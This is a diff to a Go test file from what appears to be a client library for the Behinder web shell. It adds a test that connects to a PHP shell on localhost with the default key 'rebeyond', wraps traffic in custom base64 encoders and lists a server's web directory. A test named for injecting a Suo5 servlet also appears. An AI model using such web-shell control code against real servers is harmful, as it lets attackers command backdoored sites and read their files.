@@ -11,7 +11,7 @@ import (
 	"testing"
 )
 
-func TestNewWebShell(t *testing.T) {
+func TestNewWebJSPShell(t *testing.T) {
 
 	url := "http://127.0.0.1:8080/S2-032/bx3.jsp"
 	//url = "http://127.0.0.1:8080/S2-032/bs4.jsp"
@@ -51,6 +51,45 @@ func TestNewWebShell(t *testing.T) {
 		return
 	}
 	t.Logf("%s", string(ping))
+}
+
+func TestNewWebPHPShell(t *testing.T) {
+
+	url := "http://127.0.0.1/bx4-bs64.php"
+
+	bx, _ := NewBehinderManager(url,
+		SetSecretKey("rebeyond"),
+		SetShellScript("php"),
+		SetProxy("http://127.0.0.1:9999"),
+	)
+	bx.ClientRequestEncodeFormGo(func(reqBody []byte) ([]byte, error) {
+		jsonStr := `{"go0p":"1","body":{"user":"lucky"}}`
+		encodedData := base64.StdEncoding.EncodeToString(reqBody)
+		jsonStr = strings.ReplaceAll(jsonStr, "lucky", encodedData)
+		return []byte(jsonStr), nil
+	})
+	bx.EchoResultEncodeFormGo(func(reqBody []byte) ([]byte, error) {
+		classBase64Str := `
+function encrypt($data){
+    return base64_encode($data);
+}
+`
+		return []byte(classBase64Str), nil
+	})
+	bx.EchoResultDecodeFormGo(func(rspBody []byte) ([]byte, error) {
+		decodedData, err := base64.StdEncoding.DecodeString(string(rspBody))
+		if err != nil {
+			return nil, err
+		}
+		return decodedData, nil
+	})
+	//ping, err := bx.Ping()
+	ping, err := bx.listFile("C:/phpstudy_pro/WWW/")
+	if err != nil {
+		t.Error(err)
+		return
+	}
+	t.Logf("%v", string(ping))
 }
 
 func TestInjectSuo5Servlet(t *testing.T) {
